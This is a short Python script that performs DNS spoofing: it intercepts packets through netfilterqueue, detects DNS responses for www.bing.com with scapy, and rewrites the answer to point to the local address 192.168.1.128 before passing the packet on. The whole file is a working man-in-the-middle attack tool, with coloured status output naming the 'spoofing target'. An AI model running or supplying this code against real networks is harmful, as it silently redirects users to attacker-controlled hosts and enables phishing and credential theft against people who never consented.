#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
from termcolor import colored
import sys

def close_application(sig, frame):
    print(colored("[!] Closing application...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if "www.bing.com" in qname:
            print(colored(f"[+] Spoofing target: {qname}", "green"))
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.128")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
            

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()